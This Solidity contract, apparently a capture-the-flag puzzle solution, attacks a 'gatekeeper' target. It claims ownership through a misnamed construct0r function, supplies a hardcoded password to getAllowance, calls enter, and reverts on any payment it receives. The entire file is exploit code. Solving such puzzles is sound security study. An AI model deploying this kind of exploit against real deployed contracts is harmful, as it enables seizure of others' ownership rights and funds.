pragma solidity ^0.8.0;

interface IGt {
    function construct0r() external;
    function getAllowance(uint256) external;
    function enter() external;
}


contract Attack3 {
    bool private success = false;

    IGt public immutable target;

    constructor(address payable _target) {
        target = IGt(_target);
        target.construct0r();
        uint256 password = 1751543136;
        target.getAllowance(password);
        // Now call enter
        target.enter();
    }

    receive() external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }
}